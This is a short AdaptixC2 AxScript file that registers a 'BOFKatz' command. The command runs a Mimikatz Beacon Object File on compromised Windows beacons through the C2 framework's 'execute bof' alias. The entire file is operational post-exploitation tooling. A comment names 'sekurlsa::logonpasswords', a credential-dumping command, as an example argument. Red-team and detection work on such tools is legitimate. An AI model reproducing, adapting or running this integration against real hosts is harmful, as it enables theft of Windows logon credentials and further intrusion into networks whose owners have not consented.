//
// BOFKatz — AdaptixC2 AxScript
// Mimikatz Beacon Object File implementation
//

var metadata = {
    name: "BOFKatz",
    description: "Mimikatz Beacon Object File implementation",
    store: true
};

var cmd_bofkatz = ax.create_command(
    "BOFKatz",
    "Mimikatz Beacon Object File implementation",
    "BOFKatz coffee"
);
// Optional positional argument — the mimikatz command string (e.g. "coffee", "sekurlsa::logonpasswords")
cmd_bofkatz.addArgString("command", "Mimikatz command to execute (leave blank for default)", "");
cmd_bofkatz.setPreHook(function (id, cmdline, parsed_json) {
    let command  = parsed_json["command"] || "";
    let arch     = ax.arch(id); // "x64" or "x86"
    let bof_path = ax.script_dir() + "BOFKatz." + arch + ".o";

    let bof_params = ax.bof_pack("cstr", [command]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: BOFKatz");
});

var bofkatz_group = ax.create_commands_group("BOFKatz", [cmd_bofkatz]);
ax.register_commands_group(bofkatz_group, ["beacon"], ["windows"], []);
